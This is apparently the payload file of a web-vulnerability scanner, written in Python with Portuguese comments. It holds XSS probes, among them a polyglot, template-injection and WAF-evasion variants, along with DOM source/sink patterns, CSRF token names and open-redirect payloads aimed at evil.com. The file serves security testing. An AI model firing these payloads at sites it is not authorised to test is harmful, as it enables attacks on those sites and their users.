"""
payloads.py — Payloads para XSSAndClient.
Reflected XSS, Stored XSS probe, DOM XSS heuristics, CSRF, Open Redirect.
"""

# ── XSS Payloads ──────────────────────────────────────────────────────────────

# Canary único para detectar reflexão
XSS_CANARY = "bugxss9182736"

XSS_REFLECTED = [
    # Basic
    f"<script>alert('{XSS_CANARY}')</script>",
    f"\"><img src=x onerror=alert('{XSS_CANARY}')>",
    
    # Advanced Polyglots
    # Contexts: HTML, Script, Attribute
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('{XSS_CANARY}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipT/--!>\\x3csVg/<sVg/oNloAd=alert('{XSS_CANARY}')//>\\x3e",
    
    # SVG/Math Bypass
    f"<math><a xlink:href=\"javascript:alert('{XSS_CANARY}')\">click</a></math>",
    f"<svg/onload=alert('{XSS_CANARY}')>",
    
    # AngularJS / Template Injection
    f"{{{{constructor.constructor('alert(\"{XSS_CANARY}\")')()}}}}",
    
    # WAF Evasion (Capitalization & Encoding)
    f"<%73%63%72%69%70%74>alert('{XSS_CANARY}')</%73%63%72%69%70%74>",
    f"<ScRiPt>alert('{XSS_CANARY}')</sCrIpT>",
]

# Payloads que sobrevivem a encodings comuns
XSS_STORED_PROBE = [
    f'<img src=1 onerror=alert("{XSS_CANARY}")>',
    f'"><details open ontoggle=alert("{XSS_CANARY}")>',
    f'<iframe srcdoc="<script>alert({XSS_CANARY})</script>">',
    f'<math><mtext></p><script>alert("{XSS_CANARY}")</script>',
]

# Padrões DOM source → sink (heurístico, sem execução JS)
DOM_SOURCES = [
    "location.href", "location.search", "location.hash",
    "document.URL", "document.referrer",
    "window.name", "document.cookie",
    "document.title", "document.baseURI",
    "location.pathname",
]

DOM_SINKS = [
    "document.write(", "document.writeln(",
    "innerHTML", "outerHTML",
    "eval(", "setTimeout(", "setInterval(",
    "Function(", "execScript(",
    "location =", "location.href =", "location.replace(",
    "document.domain =",
    "jQuery(", "$(", ".html(",
    "insertAdjacentHTML(",
]

# ── CSRF ──────────────────────────────────────────────────────────────────────

CSRF_TOKEN_NAMES = [
    "csrf", "csrf_token", "_token", "csrfmiddlewaretoken",
    "authenticity_token", "_csrf", "xsrf", "xsrf-token",
    "__requestverificationtoken", "nonce",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "redirecturl",
    "return", "returnurl", "return_to", "returnto",
    "next", "next_url", "nexturl",
    "url", "goto", "go", "target", "dest", "destination",
    "forward", "forwardurl", "forward_url",
    "continue", "site", "link",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F@legitimate.com",
    "/\\evil.com",
    "https:evil.com",
    "%2f%2fevil.com",
    "///evil.com",
    "https://legitimate.com@evil.com",
    "\\/evil.com",
]
